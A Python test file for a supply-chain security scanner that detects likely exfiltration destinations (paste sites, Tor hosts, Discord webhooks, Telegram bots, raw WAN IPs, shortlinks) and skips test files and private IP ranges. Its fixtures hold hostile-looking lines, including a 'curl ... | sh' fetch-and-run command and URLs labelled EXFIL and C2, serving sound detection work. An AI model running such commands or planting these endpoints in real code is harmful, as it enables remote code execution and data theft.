"""Tests for ``packages.sca.supply_chain.exfil_destinations``."""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain import exfil_destinations
from packages.sca.supply_chain.exfil_destinations import scan_target


def setup_function() -> None:
    # Force a fresh load of the bundled rules between tests so a custom
    # data-file injection in any test doesn't leak.
    exfil_destinations._RULES_CACHE = None


def _write(p: Path, body: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")


# ---------------------------------------------------------------------------
# Core detection
# ---------------------------------------------------------------------------

def test_pastebin_url_in_python_source_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import urllib.request
DATA_URL = "https://pastebin.com/raw/abc123"
""")
    findings = scan_target(tmp_path, [])
    assert any("pastebin.com" in f.detail for f in findings)
    assert findings[0].category == "paste"
    assert findings[0].severity == "medium"


def test_onion_tld_flagged_high(tmp_path: Path) -> None:
    _write(tmp_path / "x.js", """\
const C2 = "http://abcdef1234567890.onion/beacon";
""")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "tor" and f.severity == "high"
               for f in findings)


def test_discord_webhook_flagged_high(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
WEBHOOK = "https://discord.com/api/webhooks/123/abcDEF"
""")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "discord_webhook" and f.severity == "high"
               for f in findings)


def test_telegram_bot_flagged_high(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
EXFIL = "https://api.telegram.org/bot12345:abcdef/sendMessage"
""")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "telegram_bot" for f in findings)


def test_raw_ip_url_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.sh", "curl http://203.0.113.42/payload\n")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "raw_ip" for f in findings)


def test_url_shortener_flagged_low(tmp_path: Path) -> None:
    _write(tmp_path / "install.sh", "curl -L https://bit.ly/abcdef | sh\n")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "shortlink" and f.severity == "low"
               for f in findings)


def test_subdomain_match_works(tmp_path: Path) -> None:
    """A subdomain of a listed host (e.g., ``ptb.discord.com``) should
    match through host-suffix logic when the host pattern allows it."""
    _write(tmp_path / "evil.py", """\
WEBHOOK = "https://canary.discord.com/api/webhooks/1/x"
""")
    findings = scan_target(tmp_path, [])
    assert any(f.category == "discord_webhook" for f in findings)


# ---------------------------------------------------------------------------
# Should NOT flag
# ---------------------------------------------------------------------------

def test_normal_https_url_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
HOMEPAGE = "https://example.com/docs"
""")
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_github_https_url_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "README.md", """\
See [issue](https://github.com/foo/bar/issues/1) for details.
""")
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_vendored_dirs_skipped(tmp_path: Path) -> None:
    """node_modules legitimately contains references to lots of URLs."""
    _write(
        tmp_path / "node_modules" / "evil" / "index.js",
        'fetch("https://pastebin.com/raw/abc")',
    )
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_test_files_are_skipped(tmp_path: Path) -> None:
    """REGRESSION (dogfood): scanning RAPTOR's own repo produced 13
    false-positive findings, all from
    ``packages/sca/supply_chain/tests/test_exfil_destinations.py`` —
    the detector's OWN test corpus, intentionally full of suspicious
    URLs as test inputs. The walker now skips tests by default
    (mirroring reachability + python_imports), eliminating self-
    finding noise. Operators auditing a security-research repo where
    the test corpus IS the analysis target can filter findings post-
    hoc; we don't ship a ``--include-tests`` toggle yet.
    """
    _write(tmp_path / "tests" / "fixture.py", """\
URL = "https://pastebin.com/raw/abc"
""")
    findings = scan_target(tmp_path, [])
    assert findings == [], (
        f"got {len(findings)} finding(s) in a tests/ fixture; expected "
        f"none — test paths must be skipped to avoid self-finding noise"
    )


def test_non_test_file_with_suspicious_url_still_flagged(
    tmp_path: Path,
) -> None:
    """Sanity: the test-skip applies to test PATHS only — an
    exfil URL in real production source still flags."""
    _write(tmp_path / "src" / "client.py", """\
URL = "https://pastebin.com/raw/abc"
""")
    findings = scan_target(tmp_path, [])
    assert any("pastebin.com" in f.detail for f in findings), (
        "production-path finding suppressed; only tests/ should be skipped"
    )


# ---------------------------------------------------------------------------
# Bug C — raw IPv4 detector excludes non-WAN ranges (REGRESSION)
# ---------------------------------------------------------------------------
#
# The ``raw_ip`` rule matches any ``http(s)://<dot-quad>``. Threat
# model is "WAN IP bypasses CDN/DNS oversight" — loopback, RFC 1918,
# link-local don't fit. Dogfood against this repo flagged
# ``http://127.0.0.1:{proxy.port}`` in our own egress-proxy code as
# suspicious; the filter below de-noises that.

def test_loopback_ip_not_flagged(tmp_path: Path):
    """``127.0.0.1`` is loopback — our own services bind there."""
    _write(tmp_path / "src" / "proxy.py", """\
URL = "http://127.0.0.1:8080/x"
""")
    findings = scan_target(tmp_path, [])
    assert not any(
        f.category == "raw_ip" for f in findings
    ), "loopback IP must not flag as raw_ip exfil"


def test_rfc1918_private_ip_not_flagged(tmp_path: Path):
    """RFC 1918 ranges (192.168/16, 10/8, 172.16/12) are private."""
    for host in ("192.168.1.1", "10.0.0.1", "172.16.0.1"):
        _write(tmp_path / "src" / "x.py", f'URL = "http://{host}/p"\n')
        findings = scan_target(tmp_path, [])
        assert not any(
            f.category == "raw_ip" for f in findings
        ), f"private IP {host} flagged as raw_ip exfil"


def test_link_local_ip_not_flagged(tmp_path: Path):
    """169.254/16 is link-local (DHCP fallback, AWS metadata)."""
    _write(tmp_path / "src" / "x.py", 'URL = "http://169.254.169.254/p"\n')
    findings = scan_target(tmp_path, [])
    assert not any(f.category == "raw_ip" for f in findings)


def test_routable_wan_ip_still_flagged(tmp_path: Path):
    """Sanity: actual WAN IPs (TEST-NET-3 here) still flag — the
    threat model the rule was built for."""
    _write(tmp_path / "src" / "x.py", 'URL = "http://203.0.113.42/p"\n')
    findings = scan_target(tmp_path, [])
    assert any(f.category == "raw_ip" for f in findings), (
        "documentation-prefix WAN IP failed to flag — "
        "regression in the raw_ip rule"
    )


def test_binary_file_extension_not_scanned(tmp_path: Path) -> None:
    """Binary extensions are skipped entirely — this is a source-level
    grep, not a binary-string search."""
    (tmp_path / "blob.bin").write_bytes(b"https://pastebin.com/raw/abc")
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_dedup_per_file_per_host(tmp_path: Path) -> None:
    """The same paste host repeated in one file produces one finding,
    not N."""
    _write(tmp_path / "evil.py", """\
URL_A = "https://pastebin.com/raw/aaa"
URL_B = "https://pastebin.com/raw/bbb"
URL_C = "https://pastebin.com/raw/ccc"
""")
    findings = scan_target(tmp_path, [])
    assert len(findings) == 1


def test_finding_carries_line_number(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "import os\n\n\nC2 = 'http://x.onion/'\n")
    findings = scan_target(tmp_path, [])
    assert findings and findings[0].line == 4


# ---------------------------------------------------------------------------
# Cross-language test-file exclusion (regression: Go *_test.go files
# were being scanned and producing exfil FPs during the May 2026
# 200-project sweep on docker-moby)
# ---------------------------------------------------------------------------

def test_go_test_file_excluded_from_exfil_scan(tmp_path: Path) -> None:
    """``*_test.go`` files are Go's test convention — must be
    excluded from the exfil walk same as ``test_*.py``."""
    _write(
        tmp_path / "syslog_test.go",
        "package syslog\n\nconst SyslogURL = \"http://1.2.3.4\"\n",
    )
    findings = scan_target(tmp_path, [])
    assert findings == [], (
        f"Go test file flagged: {[f.detail for f in findings]}"
    )


def test_ruby_test_and_spec_files_excluded(tmp_path: Path) -> None:
    """``*_test.rb`` / ``*_spec.rb`` are Ruby's test conventions."""
    _write(tmp_path / "thing_test.rb", "URL = 'http://1.2.3.4/p'\n")
    _write(tmp_path / "thing_spec.rb", "URL = 'http://5.6.7.8/p'\n")
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_java_test_file_excluded(tmp_path: Path) -> None:
    """``XTest.java`` / ``XTests.java`` / ``XIT.java`` are common
    JVM test naming conventions (JUnit + IT for integration)."""
    _write(
        tmp_path / "FooTest.java",
        "class FooTest { String u = \"http://1.2.3.4\"; }\n",
    )
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_rust_test_file_excluded(tmp_path: Path) -> None:
    """``*_test.rs`` is Rust's filename convention for module tests
    (the ``tests/`` dir form was already covered)."""
    _write(
        tmp_path / "url_test.rs",
        "const URL: &str = \"http://1.2.3.4\";\n",
    )
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_csharp_test_file_excluded(tmp_path: Path) -> None:
    """``*Test.cs`` / ``*Tests.cs`` are common .NET test conventions
    (xUnit / NUnit / MSTest)."""
    _write(
        tmp_path / "FooTest.cs",
        "class FooTest { string url = \"http://1.2.3.4\"; }\n",
    )
    _write(
        tmp_path / "BarTests.cs",
        "class BarTests { string url = \"http://5.6.7.8\"; }\n",
    )
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_php_test_file_excluded(tmp_path: Path) -> None:
    """``*Test.php`` is PHPUnit's convention."""
    _write(
        tmp_path / "FooTest.php",
        "<?php $url = 'http://1.2.3.4';\n",
    )
    findings = scan_target(tmp_path, [])
    assert findings == []


def test_non_test_go_file_still_scanned(tmp_path: Path) -> None:
    """Sanity: production ``.go`` files (no ``_test.go`` suffix)
    must still be walked — the exclusion is naming-convention-based,
    not extension-based. Otherwise the cross-language test-name
    extension would over-fire and miss real exfil in production
    code."""
    _write(
        tmp_path / "real.go",
        "package main\nconst URL = \"http://1.2.3.4\"\n",
    )
    findings = scan_target(tmp_path, [])
    assert len(findings) >= 1, (
        "production .go file should still emit exfil findings"
    )
